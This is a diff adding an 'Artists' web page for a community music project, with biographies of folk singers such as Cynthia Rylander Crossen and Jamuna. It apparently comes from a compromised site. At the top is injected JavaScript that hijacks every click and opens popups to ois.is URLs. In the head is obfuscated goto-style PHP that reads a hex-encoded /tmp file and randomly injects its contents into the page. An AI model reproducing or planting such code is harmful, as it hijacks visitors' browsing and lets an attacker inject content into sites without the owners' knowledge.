@@ -1,0 +1,222 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+	<head>
+		<title>The Community Music Project: Artists</title>
+		<link href="cmp.css" rel="stylesheet" type="text/css">
+	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	<body>
+		<iframe id="nav" src="nav.html"></iframe>
+		
+		<p class="artist">
+			<img src="images/artists/cynthia.gif">
+			<h3>Cynthia Rylander Crossen</h3>
+			Cynthia has performed her original songs since the mid-1970's in various venues from coffeehouses 
+			to concert halls, environmental festivals to multiracial celebrations. She sings for compassion, 
+			community, and connection, the sacredness of our earth, kindness to each other, the recognition 
+			of women's voices. This spring, with help from family and friends, she created the CD 
+			Feel This Love, which is being distributed free as part of the Community Music Project. 
+		</p>
+		
+		<p class="artist">
+			<img src="images/artists/dandelion.gif">
+			<h3>dandelion john</h3>
+			A singer/songwriter originally from Pittsburgh, PA, dandelion john got his start playing 
+			blues guitar in rock clubs around his hometown. For years he played in bands and lived on 
+			the road working the club scene in places like Cleveland, Philadelphia, Washington DC, 
+			the Jersey shore, and New York City. In 1991 he engineered and co-produced legendary 
+			Pittsburgh rocker Norman Nardini's comeback album, This Old Train. 
+			This Old Train yielded 2 top ten singles in Germany and, along with his fellow band mates, 
+			he toured Germany for 3 weeks as an opening act for the Blues Brothers.
+			Dandelion stopped performing live in the fall of 1992 to concentrate on his own brand 
+			of folk music which is rooted in his unique counter culture perspective of living closer 
+			to the land. In the spring of 2000 he walked the Appalachian Trail from Georgia to Maine. 
+			This experience was captured in songs he wrote along the way and led to the recording of a 
+			demo album in 2001 entitled A Mile In My Shoes. He is currently working on his next release, 
+			as well as helping to contribute to the Community Music Project. 
+		</p>
+		
+		<p class="artist">
+			<img src="images/artists/jamuna.gif">
+			<h3>Jamuna (&#1044;&#1078;&#1077;&#1084;&#1084;&#1072; &#1061;&#1072;&#1083;&#1080;&#1076; "Djemma Khalid")</h3>
+			Russian folk singer Jamuna grew up in Moscow, attending six years of music school 
+			(accordion and piano), five years at Moscow Musical College #2 (earning a degree as a 
+			conductor and music teacher), and three years at Moscow's prestigious Gnesinij College of Music.
+			<br /><br />
+			The political turmoil of eastern Europe derailed her music studies when she won a 
+			Polish-government-sponsored Polish song competition. Due to her political views, 
+			the Soviet government initially denied her a passport to accept her prize, 
+			but under pressure from the Polish cultural authorities, finally allowed her to travel to Poland.
+			<br /><br />
+			From 1989 to 1994, she toured extensively in Poland and Germany with a group of Polish artists, 
+			singing for the Solidarity movement, learning to speak, read, write, and most importantly, 
+			sing in Polish.
+			<br /><br />
+			In 1991, she was singing in Moscow subway stations, earning quite a lot more than a typical 
+			factory or office job would have paid. With thousands of other Russians, she went to the 
+			Russian "White House" to protect Boris Yeltsin when the communist party in the Soviet 
+			parliament revolted against the glastnost policies introduced by Gorbachev.
+			<br /><br />
+			Jamuna's performances weave a rich tapestry of traditional, gypsy, and Soviet-era folk songs, 
+			set in their historical and cultural context by Jamuna's charming commentary. 
+			Much of the commentary is drawn from her own experiences as a witness to, 
+			and occasional participant in, recent Soviet history. Her performances 
+			offer a unique and very personal insight into Russia's history.
+			<br /><br />
+			She produced a CD, "Goodbye Taganka", in America in 2000, based on her recordings made in 
+			Moscow for the CD, "Podzemniy Perehod", released in Russia. "Goodbye Taganka" includes pop versions 
+			of "Papirosy" and "Taganka", a Russian prison song. 
+			The Community Music Project co-produced this CD.
+			<br /><br />
+			<a href="http://jamuna.us">Check out Jamuna's web site</a>
+		</p>
+		
+		<p class="artist">
+			<img src="images/artists/maia.gif">
+			<h3>Maia Derewicz</h3>
+			Maia Derewicz, a singer/songwriter from North Carolina, draws her inspiration from her various 
+			travels around the world and the Bahá'í Faith, a world religion based on the premise of the 
+			oneness of humanity. Maia is also inspired by the power of faith, the search for truth and 
+			her belief in divine guidance to foster spiritual growth. She feels blessed to have the gift 
+			of music, which she considers to be the ladder to the soul. Maia, a UNC Asheville graduate, 
+			is currently traveling the country with her husband Mark, making a short stop in Chapel Hill 
+			to visit friends and family. Wherever life takes her, Maia hopes to keep music a part of her 
+			journey and spirituality a part of her music.
+		</p>
+		
+		<p class="artist">
+			<img src="images/artists/carol.gif">
+			<h3>Carol Verner</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/dede.gif">
+			<h3>Dede Banks</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/john_mcsween.gif">
+			<h3>John McSween</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/laine.gif">
+			<h3>Laine Lipson</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/laurie.gif">
+			<h3>Laurie Lindgren</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/lea.gif">
+			<h3>Lea Clayton</h3>
+			Lea Clayton is an organic grower, educator, and landscape gardener. 
+			She loves to sing, play banjo, and crew on the Haw River Festival.
+		</p>
+		<p class="artist">
+			<img src="images/artists/mark_derewicz.gif">
+			<h3>Mark Derewicz</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/mark_smith.gif">
+			<h3>Mark Smith</h3>
+			<a href="www.mgeesmith.com">Singer/songwriter</a> 
+			and leader of  
+			<a href="www.mgeesmith.com/jcue.html">community singing/chanting</a>
+			.
+		</p>
+		<p class="artist">
+			<img src="images/artists/nina.gif">
+			<h3>Nina Elshiekh</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/sarbaga.gif">
+			<h3>Sarbaga Falk</h3>
+			Sarbaga Falk and Cynthia have been singing together for over twenty years; 
+			they lead singing workshops together. Sarbaga teaches meditation and follows 
+			the spiritual path of Sri Chinmoy.
+		</p>
+		<p class="artist">
+			<img src="images/artists/sue.gif">
+			<h3>Sue Wilson</h3>
+		</p>
+		<p class="artist">
+			<img src="images/artists/val.gif">
+			<h3>Val Rosado</h3>
+		</p>
+		
+	</body>
+</html>
